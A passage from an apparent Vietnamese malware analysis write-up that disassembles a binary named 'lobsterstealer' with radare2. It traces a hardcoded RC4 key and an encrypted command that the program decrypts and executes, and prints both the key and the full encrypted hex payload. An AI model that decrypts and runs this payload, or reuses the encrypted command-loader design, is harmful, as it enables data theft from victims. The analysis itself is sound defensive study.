__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2B8ne180100INS_11__wrap_iterIPhEELi0EEET_SA_
__ZNSt3__18distanceB8ne180100INS_11__wrap_iterIPhEEEENS_15iterator_traitsIT_E15difference_typeES5_S5_
__ZNSt3__110__distanceB8ne180100INS_11__wrap_iterIPhEEEENS_15iterator_traitsIT_E15difference_typeES5_S5_NS_26random_access_iterator_tagE
__ZNSt3__1miB8ne180100IPhS1_EENS_11__wrap_iterIT_E15difference_typeERKS4_RKNS2_IT0_EE
__ZNKSt3__111__wrap_iterIPhE4baseB8ne180100Ev
__ZNSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_E5firstB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE8max_sizeB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE20__throw_length_errorB8ne180100Ev
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE13__fits_in_ssoB8ne180100Em
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE16__set_short_sizeB8ne180100Em
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE19__get_short_pointerB8ne180100Ev
__ZNSt3__119__allocate_at_leastB8ne180100INS_9allocatorIcEEEENS_19__allocation_resultINS_16allocator_traitsIT_E7pointerEEERS5_m
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE7__allocB8ne180100Ev
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE11__recommendB8ne180100Em
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE16__begin_lifetimeB8ne180100EPcm
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE18__set_long_pointerB8ne180100EPc
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE14__set_long_capB8ne180100Em
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE15__set_long_sizeB8ne180100Em
__ZNSt3__1neB8ne180100IPhEEbRKNS_11__wrap_iterIT_EES6_
__ZNSt3__111char_traitsIcE6assignB8ne180100ERcRKc
__ZNKSt3__111__wrap_iterIPhEdeB8ne180100Ev
__ZNSt3__111__wrap_iterIPhEppB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE14__annotate_newB8ne180100Em
__ZNSt3__122__compressed_pair_elemINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repELi0ELb0EE5__getB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE7__allocB8ne180100Ev
__ZNSt3__114numeric_limitsImE3maxB8ne180100Ev
__ZNKSt3__19allocatorIcE8max_sizeB8ne180100Ev
__ZNKSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_E6secondB8ne180100Ev
__ZNKSt3__122__compressed_pair_elemINS_9allocatorIcEELi1ELb1EE5__getB8ne180100Ev
__ZNSt3__123__libcpp_numeric_limitsImLb1EE3maxB8ne180100Ev
__ZNSt3__114pointer_traitsIPcE10pointer_toB8ne180100ERc
__ZNSt3__19allocatorIcE8allocateB8ne180100Em
__ZNSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_E6secondB8ne180100Ev
__ZNSt3__122__compressed_pair_elemINS_9allocatorIcEELi1ELb1EE5__getB8ne180100Ev
__ZNSt3__1eqB8ne180100IPhEEbRKNS_11__wrap_iterIT_EES6_
GCC_except_table0
GCC_except_table8
GCC_except_table18
GCC_except_table24
GCC_except_table29
GCC_except_table40
GCC_except_table56
GCC_except_table81
GCC_except_table84
GCC_except_table102
GCC_except_table103
GCC_except_table131
GCC_except_table141
GCC_except_table153
GCC_except_table162
GCC_except_table163
GCC_except_table165
GCC_except_table180
GCC_except_table185
```
Output làm lộ ra các hàm xử lý quan trọng đã bị C++ name mangling:

__Z11rc4_decrypt... (Mã hóa RC4)

__Z12hex_to_bytes... (Chuyển đổi Hex sang mảng Byte)

__Z25execute_decrypted_command... (Thực thi lệnh sau giải mã)

Biết được mã độc dùng RC4, chúng ta sử dụng Radare2 để mổ xẻ mã Assembly của hàm main nhằm tìm kiếm khóa (key) tĩnh được gắn cứng trong code. Chi tiết thao tác như sau:

1. Khởi động và phân tích tự động toàn bộ mã nguồn:
   r2 lobsterstealer
   [0x00000000]> aaa
2. Xác định vị trí và nhảy đến hàm main:
   [0x00000000]> afl | grep main
   0x100001000    15    399 main
   [0x00000000]> s main
3. Hiển thị mã Assembly (Disassemble) của hàm main:
   [0x100001000]> pdf

Mình thu được nội dung của hàm main như sau:
   ```
pdf
            ;-- entry0:
            ;-- func.100001000:
            ;-- rip:
┌ 399: int main (int argc, char **argv, char **envp);
│ afv: vars(12:sp[0xc..0xd8])
│           0x100001000      55             push rbp
│           0x100001001      4889e5         mov rbp, rsp
│           0x100001004      4881ecd000..   sub rsp, 0xd0
│           0x10000100b      c745fc0000..   mov dword [var_4h], 0
│           0x100001012      488d35003d..   lea rsi, str.a37c59750ed63b04e4cdd2541cf4a26da721dd0d94cc7200301e88f97e9e209ffd2eac477f67f78c7d1fe2e1ab086b44987d6e7a5804d107d9a1efcebafe2b09fb7fa61e8a02b35da36d22faf669fc7233cb1fb1f932da654ade44da3544218135e04794f1b1697e9991fac93ca822871fac18966c99e22c6d20f983182235da4cbcc4740cfca434d7276133d38dc5ee3db6dda404049ff416bbfa65d3351d7d0f2590d53d0a0e49c9a24ee33213d7ae7980ede026acbb5af83b7d2cdeea1c7ac4c1e32bf6bd362abd5163abecf75b164f5a8c12a241374767dbaf86877c27a3690fdc8dc5153f8b2e72f7824164a4ceb6aadb426c44bbd891ceb615ea2b9a28e187c2a80be3c31a9d32a9f06bc95e20b9a4ebb76cc91dbf7923c3dd6c918a3f0f6d1127e44ad0f09cf8473b659caf8eca69245dded507804aecbb211e7006a63e3214bdd28be081ea19f92557b51c9066993cebbc176a96398cddfbca34c2093595c4ce9844926c344bcdbd3e4f4e916869ab08973dc2017ee3f9142b83b33d26c6cf5ade8dc676828e45e863d533b8d724327db826fc48fdf2fa0c44af3cdbd9803c61db4aa59848e2a5f3ca159972ff0bcd1efe6ba2e82b25695e10b242809a975ebca6b900f0309e5ea78f69c0f404d6c3c160c05c3c26bb8114d27dcde486f97a3facb360bb25d49d358ce4bc646c5c9fb37fe1348c2bbaf0a1e920a200b1a832927aa8d708ac70d5d5bb763f969524b11070c651393e7d1e308de983b5bcb2128fceb10c717f60a7f6f2e0edf453a8c63bf919e19ec701399872b1bc65b0a5539e20136f8c3f03bd807b30094382d6bb86293712000ad609123e662c7dfa1edb765b2c479730eba1b6f36a4962042539b45e5a0b0154d22a39079edb281e35b98db2254c709c3d32fbb575ce1bfd19dab6fd7327b7509b9027e11ff3ab79c552a02273642f33d392c7c18eb4a4d38dba54626301222169f8023f74521289ca42f1be64083c2e6c94bcaa11a5e63bb161b49a38088a8dd783c650b250af7e0639962d1bc91ab99dd7bce7f0c3b889a60b2c0071189cf40f603c00d09365a919986c4835dfe39b992c43ea08c90e422432518400ac00343b5fbe134b1c323560b8a028d07a6706f06b7d66635e8a638ead170fdb423fe44975f12cc98362bd65b8fccfca4a7dc8cbf439053ba644812fbb508f0d9952e106232ff7300128f4d67688787709507eb142b6936dc2f6622ee91ee4f4a080131403535282ffa18dc1fce6902e510a3ed4cd80f71d95d18c31e360a3d8a07822974d71452f126f7145d57b4255434bfd600d6f174c7bfcca2e3ea6d75be1c986dabbce201e89a748771d8fd9261619e52093a720b29df580fa4b34904b6b7d31f36f690743b0ba56603ae6105553f0b4f211a063a378b67c52c208ada2326ae07cbdb8a8e65737e63364b8a38a40de0000314b1bd284eb57f583d12e310c90e371c0f031ba7ceb305b240bb492b7fdab00d7962218402f5200fdc0eab978a4aaf55da114a8825626a82cbd33eda02334447885b81213560b87ce76443fafadc2694c275f6adbbf5671b6a1c7a68297a4c8233ebfe18257a652aaaf0a3c5d48c6a2b605164af3af42fa19913383e2a72b3cb84d73c4624e53b8895e5cc6566cdcec548a8466a54e05e21d095891c9c76cccc62aaa36cb3fc1363b79c24136bbe172c0b8a8f28c5d0b32f68a3c762eab93343de28c201d475650c211315708ee7a4ca0fff64b716562c9b70cc74a11f94cf085dd5acf5bc2c1139820cf4f362e5f489e2ec76faa5e79bb2d2f8719fe85b6bd9da2d781538a7d9a165dbe796581f5212f677ed4eb5249bd729962b026f0ba472705351deb00c5ba3a49518abd98ffba5470faf1543d234cc5748877c5a22209c0b8765595fd46fcf5a2419c7fe233c46be3520a05555f9f1884806cb7f3843fe1a860237f0e6bd01dd53bc46582e4be01051bc797566dfa5dd6e8e1ad5d142a29218ba31266f89da9d44fb8526c2f25dc7177f498552136e72dec98c5a4e009f623ada2b1c560a59576f4d3efb523b0963f2c4e9fe6ca7865df60398c674c53782b3a2df5977df0e66e4d97de555847b06b4485d46dd433da39ac0cbce3a266257a7ade541586e76d2a84107e92b1adbe1a1c063908d270efa5ee9e4b5b0e38e2b030aec2c9ba1f69a24b72a66075f714b06ed28f7a48945819f92ae613c696a09f4f15d13b3b62d59e7950d4860ed5c76d34793f065c3d9c758f7155e33e5d9874fdd2df6c79fdf6eb8bb13957cd4bc38c7e0f63e9e95524c07511c89bdd41fc688894ba41b54b7d1e24a5512e727e0f810ccd51a0a34c2b6dbe7812299e22ee172362d418a516a291cc41968a7e02caacd6dcd971afca4ac56e53964acf7e3f90af8101f66e496a8727ec0ff60ddb9035ce8ce3182c338b7ad8538a7d2fb30045eee76c856aaca32294291593a849b7aa0b6f0e832b852e8a2f14ffcbac295b6cae2c6d5b34c05900c43174387025a9c480ead6d89927feee9995a413e1bc77c7dc4d3a1b74380d13ec010c0cf07b408bd848dcbcc3219efe78a77e2c9b524e768de9597b13213d8962d8394da16692c0a696eb3f308a411e966b52a3d2e58df292f0b65d65fabc3eae9d9e63bb9f87a564f390e3a36a0c73899198541919eb742358324f62e4cc39d205306de08c3d25aefc7fab97ac55abd4ed66ee107458329940d6cb68fff88c2f66b82a4855fb95074b512e5664487a43a6c6cfbbbe157d40d021db8cb076f60fa97bdaace63ef09aa396ec4dc9bcc5f428083205f43aa2b34aa635031427dec7df4e6da044302a51e4f2979a97e96d5ae3485397d44947baf363555e48be9ebb979c66424d8e1e5d1bf4bd ; 0x100004d19 ; "a37c59750ed63b04e4cdd2541cf4a26da721dd0d94cc7200301e88f97e9e209ffd2eac477f67f78c7d1fe2e1ab086b44987d6e7a5804d107d9a1efcebafe2b09fb7fa61e8a02b35da36d22faf669fc7233cb1fb1f932da654ade44da3544218135e04794f1b1697e9991fac93ca822871fac18966c99e22c6d20f983182235da4cbcc4740cfca434d7276133d38dc5ee3db6dda404049ff416bbfa65d3351d7d0f2590d53d0a0e49c9a24ee33213d7ae7980ede026acbb5af83b7d2cdeea1c7ac4c1e32bf6bd362abd5163abecf75b164f5a8c12a241374767dbaf86877c27a3690fdc8dc5153f8b2e72f7824164a4ceb6aadb426c44bbd891ceb615ea2b9a28e187c2a80be3c31a9d32a9f06bc95e20b9a4ebb76cc91dbf7923c3dd6c918a3f0f6d1127e44ad0f09cf8473b659caf8eca69245dded507804aecbb211e7006a63e3214bdd28be081ea19f92557b51c9066993cebbc176a96398cddfbca34c2093595c4ce9844926c344bcdbd3e4f4e916869ab08973dc2017ee3f9142b83b33d26c6cf5ade8dc676828e45e863d533b8d724327db826fc48fdf2fa0c44af3cdbd" ; int64_t arg2
│           0x100001019      488d7de0       lea rdi, [var_20h]         ; int64_t arg1
│           0x10000101d      e85e020000     call sym.__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100ILi0EEEPKc
│           0x100001022      488d3503ce..   lea rsi, str.9f0fe4d8821ad05cc39a80644daeb8b1 ; 0x10000de2c ; "9f0fe4d8821ad05cc39a80644daeb8b1" ; int64_t arg2
│           0x100001029      488d7dc8       lea rdi, [var_38h]         ; int64_t arg1
│           0x10000102d      e84e020000     call sym.__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100ILi0EEEPKc
│       ┌─< 0x100001032      e900000000     jmp 0x100001037
│       │   ; CODE XREF from main @ 0x100001032(x)
│       └─> 0x100001037      488d7da0       lea rdi, [var_60h]         ; int64_t arg1
│           0x10000103b      488d75c8       lea rsi, [var_38h]         ; int64_t arg2
│           0x10000103f      e8dcfbffff     call sym.hex_to_bytes_std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char____const_ ; func.100000c20
│       ┌─< 0x100001044      e900000000     jmp 0x100001049
│       │   ; CODE XREF from main @ 0x100001044(x)
│       └─> 0x100001049      488d7d88       lea rdi, [var_78h]         ; int64_t arg1
│           0x10000104d      488d75e0       lea rsi, [var_20h]         ; int64_t arg2
│           0x100001051      e8cafbffff     call sym.hex_to_bytes_std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char____const_ ; func.100000c20
│       ┌─< 0x100001056      e900000000     jmp 0x10000105b
│       │   ; CODE XREF from main @ 0x100001056(x)
│       └─> 0x10000105b      488dbd70ff..   lea rdi, [var_90h]         ; int64_t arg1
│           0x100001062      488d75a0       lea rsi, [var_60h]         ; int64_t arg2
│           0x100001066      488d5588       lea rdx, [var_78h]         ; int64_t arg3
│           0x10000106a      e831f7ffff     call sym.rc4_decrypt_std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char____const__std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char____const_ ; func.1000007a0
│       ┌─< 0x10000106f      e900000000     jmp 0x100001074
│       │   ; CODE XREF from main @ 0x10000106f(x)
│       └─> 0x100001074      488dbd70ff..   lea rdi, [var_90h]         ; int64_t arg1
│           0x10000107b      4889bd40ff..   mov qword [var_c0h], rdi
│           0x100001082      e829020000     call method.std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char___.begin_abi:ne180100___ ; func.1000012b0
│           0x100001087      488bbd40ff..   mov rdi, qword [var_c0h]   ; int64_t arg1
│           0x10000108e      48898550ff..   mov qword [var_b0h], rax
│           0x100001095      e846020000     call method.std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char___.end_abi:ne180100___ ; func.1000012e0
│           0x10000109a      48898548ff..   mov qword [var_b8h], rax
│           0x1000010a1      488bb550ff..   mov rsi, qword [var_b0h]   ; int64_t arg2
│           0x1000010a8      488b9548ff..   mov rdx, qword [var_b8h]   ; int64_t arg3
│           0x1000010af      488dbd58ff..   lea rdi, [var_a8h]         ; int64_t arg1
│           0x1000010b6      e855020000     call sym.std::__1::__wrap_iter_unsigned_char__std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char___::basic_string_abi:ne180100__std::__1::__wrap_iter_unsigned_char___0__std::__1::__wrap_iter_unsigned_char__ ; func.100001310
│       ┌─< 0x1000010bb      e900000000     jmp 0x1000010c0
│       │   ; CODE XREF from main @ 0x1000010bb(x)
│       └─> 0x1000010c0      488b3d01d0..   mov rdi, qword [reloc.std::__1::cout] ; [0x10000e0c8:8]=0x8010000000000019 ; char **arg1
│           0x1000010c7      488d357fcd..   lea rsi, str.Decrypted_command: ; 0x10000de4d ; "Decrypted command: " ; int64_t arg2
│           0x1000010ce      e87dfeffff     call method.std::__1::basic_ostream_char__std::__1::char_traits_char____std::__1::operator___abi:ne180100__std::__1.char_traits_char____std::__1::basic_ostream_char__std::__1::char_traits_char_____char_const_ ; func.100000f50
│           0x1000010d3      48898538ff..   mov qword [var_c8h], rax
│       ┌─< 0x1000010da      e900000000     jmp 0x1000010df
│       │   ; CODE XREF from main @ 0x1000010da(x)
│       └─> 0x1000010df      488bbd38ff..   mov rdi, qword [var_c8h]
│           0x1000010e6      488db558ff..   lea rsi, [var_a8h]
│           0x1000010ed      e84e020000     call method.std::__1::basic_ostream_char__std::__1::char_traits_char____std::__1::operator___abi:ne180100__char__std::__1::char_traits_char___std::__1.allocator_char____std::__1::basic_ostream_char__std::__1::char_traits_char_____std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char____const_ ; func.100001340
│           0x1000010f2      48898530ff..   mov qword [var_d0h], rax
│       ┌─< 0x1000010f9      e900000000     jmp 0x1000010fe
│       │   ; CODE XREF from main @ 0x1000010f9(x)
│       └─> 0x1000010fe      488bbd30ff..   mov rdi, qword [var_d0h]   ; int64_t arg1
│           0x100001105      488d35a4fe..   lea rsi, [method.std::__1::basic_ostream_char__std::__1::char_traits_char____std::__1::endl_abi:ne180100__char__std::__1.char_traits_char____std::__1::basic_ostream_char__std::__1::char_traits_char____] ; 0x100000fb0 ; int64_t arg2
│           0x10000110c      e87ffeffff     call method.std::__1::basic_ostream_char__std::__1::char_traits_char___.operator___abi:ne180100__std::__1::basic_ostream_char__std::__1::char_traits_char_______std::__1::basic_ostream_char__std::__1::char_traits_char_____ ; func.100000f90
│       ┌─< 0x100001111      e900000000     jmp 0x100001116
│       │   ; CODE XREF from main @ 0x100001111(x)
│       └─> 0x100001116      488dbd58ff..   lea rdi, [var_a8h]         ; int64_t arg1
│           0x10000111d      e86efdffff     call sym.execute_decrypted_command_std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char____const_ ; func.100000e90
│       ┌─< 0x100001122      e900000000     jmp 0x100001127
│       │   ; CODE XREF from main @ 0x100001122(x)
│       └─> 0x100001127      c745fc0000..   mov dword [var_4h], 0
│           0x10000112e      488dbd58ff..   lea rdi, [var_a8h]
│           0x100001135      e83c380000     call sym.imp.std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char___::_basic_string__ ; std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::~basic_string()
│       ┌─< 0x10000113a      e972000000     jmp 0x1000011b1
..
│ │││││││   ; CODE XREF from main @ 0x10000113a(x)
│ ││││││└─> 0x1000011b1      488dbd70ff..   lea rdi, [var_90h]         ; int64_t arg1
│ ││││││    0x1000011b8      e833faffff     call method.std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char___._vector_abi:ne180100___ ; func.100000bf0
│ ││││││┌─< 0x1000011bd      e905000000     jmp 0x1000011c7
  │││││││   ; CODE XREF from main @ +0x1ac(x)
..
│  ││││││   ; CODE XREF from main @ 0x1000011bd(x)
│  │││││└─> 0x1000011c7      488d7d88       lea rdi, [var_78h]         ; int64_t arg1
│  │││││    0x1000011cb      e820faffff     call method.std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char___._vector_abi:ne180100___ ; func.100000bf0
│  │││││┌─< 0x1000011d0      e916000000     jmp 0x1000011eb
   ││││││   ; CODE XREFS from main @ +0x18f(x), +0x1c2(x)
..
   ││││││   ; CODE XREF from main @ +0x1e1(x)
│ │ │││││   ; CODE XREF from main @ 0x1000011d0(x)
│ │ ││││└─> 0x1000011eb      488d7da0       lea rdi, [var_60h]         ; int64_t arg1
│ │ ││││    0x1000011ef      e8fcf9ffff     call method.std::__1::vector_unsigned_char__std::__1::allocator_unsigned_char___._vector_abi:ne180100___ ; func.100000bf0
│ │ ││││┌─< 0x1000011f4      e913000000     jmp 0x10000120c
  │ │││││   ; CODE XREFS from main @ +0x17e(x), +0x1e6(x)
..
    │││││   ; CODE XREF from main @ +0x202(x)
│  │ ││││   ; CODE XREF from main @ 0x1000011f4(x)
│  │ │││└─> 0x10000120c      488d7dc8       lea rdi, [var_38h]
│  │ │││    0x100001210      e861370000     call sym.imp.std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char___::_basic_string__ ; std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::~basic_string()
│  │ │││┌─< 0x100001215      e913000000     jmp 0x10000122d
   │ ││││   ; CODE XREFS from main @ +0x16d(x), +0x207(x)
..
     ││││   ; CODE XREF from main @ +0x223(x)
│   │ │││   ; CODE XREF from main @ 0x100001215(x)
│   │ ││└─> 0x10000122d      488d7de0       lea rdi, [var_20h]
│   │ ││    0x100001231      e840370000     call sym.imp.std::__1::basic_string_char__std::__1::char_traits_char___std::__1::allocator_char___::_basic_string__ ; std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> >::~basic_string()
│   │ ││    0x100001236      8b45fc         mov eax, dword [var_4h]
│   │ ││    0x100001239      4881c4d000..   add rsp, 0xd0
│   │ ││    0x100001240      5d             pop rbp
└   │ ││    0x100001241      c3             ret
```
4. Đọc mã Assembly để truy vết Key và Payload:
Tìm Encrypted Payload: Tại địa chỉ 0x100001012, mã độc nạp một chuỗi hex khổng lồ vào thanh ghi rsi:
0x100001012  lea rsi, str.a37c59750ed63b04...

Tìm RC4 Key: Ngay bên dưới, tại địa chỉ 0x100001022, một chuỗi hex 32 ký tự tiếp tục được nạp:
0x100001022  lea rsi, str.9f0fe4d8821ad05cc39a80644daeb8b1 nên RC4 Key là : 9f0fe4d8821ad05cc39a80644daeb8b1

Xác nhận thuật toán: Cả hai chuỗi hex này sau đó được truyền qua các lệnh call sym.hex_to_bytes... (dòng 0x10000103f và 0x100001051) để chuyển thành mảng byte, trước khi đẩy thẳng vào hàm giải mã ở dòng 0x10000106a:
0x10000106a  call sym.rc4_decrypt...
5. Trích xuất Payload
Vì lệnh df trong radare2 bị cắt ngang đâm ra không trích đủ payload, để bù đắp cho điều đó mình dùng strings với grep là a37c59:
strings lobsterstealer | grep "a37c5975"
```
a37c59750ed63b04e4cdd2541cf4a26da721dd0d94cc7200301e88f97e9e209ffd2eac477f67f78c7d1fe2e1ab086b44987d6e7a5804d107d9a1efcebafe2b09fb7fa61e8a02b35da36d22faf669fc7233cb1fb1f932da654ade44da3544218135e04794f1b1697e9991fac93ca822871fac18966c99e22c6d20f983182235da4cbcc4740cfca434d7276133d38dc5ee3db6dda404049ff416bbfa65d3351d7d0f2590d53d0a0e49c9a24ee33213d7ae7980ede026acbb5af83b7d2cdeea1c7ac4c1e32bf6bd362abd5163abecf75b164f5a8c12a241374767dbaf86877c27a3690fdc8dc5153f8b2e72f7824164a4ceb6aadb426c44bbd891ceb615ea2b9a28e187c2a80be3c31a9d32a9f06bc95e20b9a4ebb76cc91dbf7923c3dd6c918a3f0f6d1127e44ad0f09cf8473b659caf8eca69245dded507804aecbb211e7006a63e3214bdd28be081ea19f92557b51c9066993cebbc176a96398cddfbca34c2093595c4ce9844926c344bcdbd3e4f4e916869ab08973dc2017ee3f9142b83b33d26c6cf5ade8dc676828e45e863d533b8d724327db826fc48fdf2fa0c44af3cdbd9803c61db4aa59848e2a5f3ca159972ff0bcd1efe6ba2e82b25695e10b242809a975ebca6b900f0309e5ea78f69c0f404d6c3c160c05c3c26bb8114d27dcde486f97a3facb360bb25d49d358ce4bc646c5c9fb37fe1348c2bbaf0a1e920a200b1a832927aa8d708ac70d5d5bb763f969524b11070c651393e7d1e308de983b5bcb2128fceb10c717f60a7f6f2e0edf453a8c63bf919e19ec701399872b1bc65b0a5539e20136f8c3f03bd807b30094382d6bb86293712000ad609123e662c7dfa1edb765b2c479730eba1b6f36a4962042539b45e5a0b0154d22a39079edb281e35b98db2254c709c3d32fbb575ce1bfd19dab6fd7327b7509b9027e11ff3ab79c552a02273642f33d392c7c18eb4a4d38dba54626301222169f8023f74521289ca42f1be64083c2e6c94bcaa11a5e63bb161b49a38088a8dd783c650b250af7e0639962d1bc91ab99dd7bce7f0c3b889a60b2c0071189cf40f603c00d09365a919986c4835dfe39b992c43ea08c90e422432518400ac00343b5fbe134b1c323560b8a028d07a6706f06b7d66635e8a638ead170fdb423fe44975f12cc98362bd65b8fccfca4a7dc8cbf439053ba644812fbb508f0d9952e106232ff7300128f4d67688787709507eb142b6936dc2f6622ee91ee4f4a080131403535282ffa18dc1fce6902e510a3ed4cd80f71d95d18c31e360a3d8a07822974d71452f126f7145d57b4255434bfd600d6f174c7bfcca2e3ea6d75be1c986dabbce201e89a748771d8fd9261619e52093a720b29df580fa4b34904b6b7d31f36f690743b0ba56603ae6105553f0b4f211a063a378b67c52c208ada2326ae07cbdb8a8e65737e63364b8a38a40de0000314b1bd284eb57f583d12e310c90e371c0f031ba7ceb305b240bb492b7fdab00d7962218402f5200fdc0eab978a4aaf55da114a8825626a82cbd33eda02334447885b81213560b87ce76443fafadc2694c275f6adbbf5671b6a1c7a68297a4c8233ebfe18257a652aaaf0a3c5d48c6a2b605164af3af42fa19913383e2a72b3cb84d73c4624e53b8895e5cc6566cdcec548a8466a54e05e21d095891c9c76cccc62aaa36cb3fc1363b79c24136bbe172c0b8a8f28c5d0b32f68a3c762eab93343de28c201d475650c211315708ee7a4ca0fff64b716562c9b70cc74a11f94cf085dd5acf5bc2c1139820cf4f362e5f489e2ec76faa5e79bb2d2f8719fe85b6bd9da2d781538a7d9a165dbe796581f5212f677ed4eb5249bd729962b026f0ba472705351deb00c5ba3a49518abd98ffba5470faf1543d234cc5748877c5a22209c0b8765595fd46fcf5a2419c7fe233c46be3520a05555f9f1884806cb7f3843fe1a860237f0e6bd01dd53bc46582e4be01051bc797566dfa5dd6e8e1ad5d142a29218ba31266f89da9d44fb8526c2f25dc7177f498552136e72dec98c5a4e009f623ada2b1c560a59576f4d3efb523b0963f2c4e9fe6ca7865df60398c674c53782b3a2df5977df0e66e4d97de555847b06b4485d46dd433da39ac0cbce3a266257a7ade541586e76d2a84107e92b1adbe1a1c063908d270efa5ee9e4b5b0e38e2b030aec2c9ba1f69a24b72a66075f714b06ed28f7a48945819f92ae613c696a09f4f15d13b3b62d59e7950d4860ed5c76d34793f065c3d9c758f7155e33e5d9874fdd2df6c79fdf6eb8bb13957cd4bc38c7e0f63e9e95524c07511c89bdd41fc688894ba41b54b7d1e24a5512e727e0f810ccd51a0a34c2b6dbe7812299e22ee172362d418a516a291cc41968a7e02caacd6dcd971afca4ac56e53964acf7e3f90af8101f66e496a8727ec0ff60ddb9035ce8ce3182c338b7ad8538a7d2fb30045eee76c856aaca32294291593a849b7aa0b6f0e832b852e8a2f14ffcbac295b6cae2c6d5b34c05900c43174387025a9c480ead6d89927feee9995a413e1bc77c7dc4d3a1b74380d13ec010c0cf07b408bd848dcbcc3219efe78a77e2c9b524e768de9597b13213d8962d8394da16692c0a696eb3f308a411e966b52a3d2e58df292f0b65d65fabc3eae9d9e63bb9f87a564f390e3a36a0c73899198541919eb742358324f62e4cc39d205306de08c3d25aefc7fab97ac55abd4ed66ee107458329940d6cb68fff88c2f66b82a4855fb95074b512e5664487a43a6c6cfbbbe157d40d021db8cb076f60fa97bdaace63ef09aa396ec4dc9bcc5f428083205f43aa2b34aa635031427dec7df4e6da044302a51e4f2979a97e96d5ae3485397d44947baf363555e48be9ebb979c66424d8e1e5d1bf4bd210b2d164256306b1c3f5019b31586bc64e82b2b128638b4e90d3144216ac25cb956a89d1aa16362ba3b117ad51d0785a9db6e4397e9d3a4f058adec6d98e8db5094cb1c61306851d4ebfe7554b89b101bd9153f2665376805fada196369332067d07797b6fe50ffa6293272006e85b23f8e0ed769abcff3b50d2d075f1c37e60093a5978408753f81d35b99b08117d261bfe74bd806193ee62ea1c1bb285bbe4707e7fbced50b89d1e3214c794b0bea8b6f5e9efe380997930326d52fb4a6a61879c6f7459eae23a19632407eebabb37059315b94d405547a74abf5680f9fefcb07b7ac889edd0d80f620c2c1461a5e4a8622172728c27956f1d80f190e302ced36cd9c7c78bfbfe00c079cafc55e308aa45964656dc94d410473bd5f6d78b95569c75a7ba026ea638acb55ce597afbe5cfcb9665aa1ace89f763b358f9a81b28dd56478a82b4ea15158437c576b6e6e51bc3cead441f133ce663a52a2560fbaab8402cb672a5d0f18e0bf49ae692caa7705c58793142928e80f16591b2706379379d9102f122ef9273a1f84f8ed2bc3a6c78641a4ed71510f044b3de110ecd843c770d27a4736821798f849e5739129678ac38fbf6e37d3ae3a82dbca1093dcd676102c7d718001c2d10f4c0dba127283e9607455118222314cf14ca453615754131dc3a9934d8fd24a61f607b83267d7dec398f81cdc4bca2709d03523f445e115662cd8320582adc985dbf7b1ce668f4664cda676022afc8f817067621449f3bab3cabad01fc50bdedbf94f578e02260f971eb87e06f273326d1c96ede028cccfd4d764df28478862f5b89acec5ba09e9397a6e332ddb55adcec94e65bee6ec6592ae9ce6f40e7cbefcadcac8036e99b6a0e7788773c4a8e3cf09895252136810af6501a2ac7b90fb306df2b988d4fc66deffed37c4b0e1e15aafc925dd7bc5d39adcf48d38e693d7b83e7c7a3e34e6f20511e575f880bfa6d93a19958186fbd2dc7cfeb499461db13c10f0d941ff164e13093306318c77ef275801ce924b77fc15b2343d738afa7f94317e212aa2da0ecb6d7eac5d201c2b2b2f0710371256180f43fc358364a2b17c32b4f1b73e641e3ef75d6818114cf39a8e845718118d5cb27121bab74ebe8ec5b923b0fb0459fc2df0ee12b2a2f186b7646b4684097dc323d7cf4c81ba907a96be0fb2d0f292aac02e23a95ba97a8d60641e26847dc1b876f1fe670e0ef058bf370dfe64fbcee6bb5252d927e4f38ea9e225cc2f793ae5b4dd90aee44badd3b03e26ef705a1dbf38e624ce938db6013fc0782a6ea0206dda123489de58d7ca9c014602b84e799ff3da2228917c3e0073f25ab3e1db84183c41a9d6cb00d2ced245ed9549e0f0fd376268b83e36b7029c4d27948c381cd682da8e5764b9b86ecada4b02e6260411ba1323cc12837bbac1f11695616eabc7b8e6d03d75e47922581bbc6457adaa1c57b76f632159094b098b3eb92dc15a57fb5032e1f87bc8f8746817923159a95a5b60efae0f494c8b668533379e0e6f93cc74f709eb1f841e1b4e26da76816f9a7917207df5f96081bc151f0ce585111ad05dd198cf9223c88e9e34fbf5d1c6af999cf786917e2ec